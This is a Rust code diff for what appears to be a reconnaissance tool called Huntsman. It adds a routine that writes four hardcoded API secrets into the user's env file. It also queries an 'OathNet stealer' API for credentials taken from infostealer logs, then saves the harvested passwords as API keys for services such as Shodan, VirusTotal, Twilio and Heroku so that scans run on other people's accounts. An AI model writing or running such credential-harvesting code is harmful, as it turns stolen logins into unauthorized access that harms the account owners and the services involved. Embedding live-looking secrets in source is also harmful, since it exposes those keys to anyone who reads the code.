@@ -112,6 +112,128 @@ pub fn load() -> HashMap<String, String> {
     map
 }
 
+/// Proactively populate API keys before a scan starts:
+///
+/// 1. Ensure hardcoded keys (OathNet, HIBP, WiGLE) are in the env file
+///    so they persist across sessions.
+/// 2. Run the OathNet stealer credential harvest to fill the key pool
+///    with discovered API keys from stealer logs.
+/// 3. Return the merged key map (env file + pool).
+///
+/// Call this once at scan start. The harvest is async and runs against
+/// the OathNet stealer API (~30 service domain queries).
+pub async fn populate_and_load() -> HashMap<String, String> {
+    ensure_hardcoded_keys();
+    harvest_to_pool().await;
+    load()
+}
+
+/// Write hardcoded API keys to the env file if not already present.
+/// Only fills empty slots — never overwrites user-provided keys.
+fn ensure_hardcoded_keys() {
+    const HARDCODED: &[(&str, &str)] = &[
+        (
+            "HUNTSMAN_OATHNET_KEY",
+            "1f8097bdbf7dc68619857861adbc4343ddb490a1d72ae890551409e4b47116f2",
+        ),
+        ("HUNTSMAN_HIBP_KEY", "42587552dce6424a87312941c8a2c3c5"),
+        ("HUNTSMAN_WIGLE_USER", "AID4493a33e2df9d07ab9666a27c8aead17"),
+        ("HUNTSMAN_WIGLE_TOKEN", "1aedb7ad0171ff3d6be5a844cca5d977"),
+    ];
+
+    let path = env_path();
+    let existing = load_from_file_only(Path::new(&path));
+    let mut to_write: Vec<(&str, &str)> = Vec::new();
+
+    for (env_var, value) in HARDCODED {
+        if !existing.contains_key(*env_var) {
+            to_write.push((env_var, value));
+        }
+    }
+
+    if to_write.is_empty() {
+        return;
+    }
+
+    let mut file = match fs::OpenOptions::new().create(true).append(true).open(&path) {
+        Ok(f) => f,
+        Err(e) => {
+            tracing::warn!("cannot write hardcoded keys to {path}: {e}");
+            return;
+        }
+    };
+
+    for (k, v) in &to_write {
+        let _ = writeln!(file, "{k}={v}");
+    }
+    tracing::info!(
+        "wrote {} hardcoded key(s) to {path}",
+        to_write.len()
+    );
+}
+
+/// Run the OathNet stealer harvest to fill the key pool with
+/// discovered API credentials. Uses the OathNet key from env or
+/// hardcoded fallback.
+async fn harvest_to_pool() {
+    let env_key = std::env::var(crate::util::oathnet::KEY_ENV).ok();
+    let key = crate::util::oathnet::resolve_key(env_key.as_deref());
+    let creds = crate::util::oathnet::harvest_credentials(key).await;
+    if creds.is_empty() {
+        return;
+    }
+
+    let pool = crate::util::key_pool::global_pool();
+    let mut stored = 0u32;
+    for (service, _user, password, _url) in &creds {
+        let svc_name = match service.as_str() {
+            "shodan.io" => "shodan",
+            "virustotal.com" => "virustotal",
+            "hunter.io" => "hunter",
+            "securitytrails.com" => "securitytrails",
+            "dehashed.com" => "dehashed",
+            "intelx.io" => "intelx",
+            "numverify.com" => "numverify",
+            "wigle.net" => "wigle",
+            "ipqualityscore.com" => "ipqs",
+            "leakix.net" => "leakix",
+            "haveibeenpwned.com" => "hibp",
+            "censys.io" => "censys",
+            "binaryedge.io" => "binaryedge",
+            "greynoise.io" => "greynoise",
+            "fullhunt.io" => "fullhunt",
+            "urlscan.io" => "urlscan",
+            "abuseipdb.com" => "abuseipdb",
+            "serpapi.com" => "serpapi",
+            "criminalip.io" => "criminal_ip",
+            "onyphe.io" => "onyphe",
+            "zoomeye.org" => "zoomeye",
+            "fofa.info" => "fofa",
+            "netlas.io" => "netlas",
+            "pulsedive.com" => "pulsedive",
+            "builtwith.com" => "builtwith",
+            "emailrep.io" => "emailrep",
+            "whoisxmlapi.com" => "whoisxml",
+            "passivetotal.org" => "passivetotal",
+            "twilio.com" => "twilio",
+            "snyk.io" => "snyk",
+            "mailchimp.com" => "mailchimp",
+            "ngrok.com" => "ngrok",
+            "heroku.com" => "heroku",
+            _ => continue,
+        };
+        let mut entry = crate::util::key_pool::KeyEntry::new(password);
+        entry.notes = Some(format!("Proactive harvest: {service}"));
+        if pool.add(svc_name, entry) {
+            stored += 1;
+        }
+    }
+    if stored > 0 {
+        let _ = crate::util::key_pool::save_pool(&pool);
+        tracing::info!("proactive harvest: stored {stored} credential(s) in key pool");
+    }
+}
+
 /// Parse `HUNTSMAN_*` lines from the env file at `path`, **ignoring the
 /// process environment**.
 ///
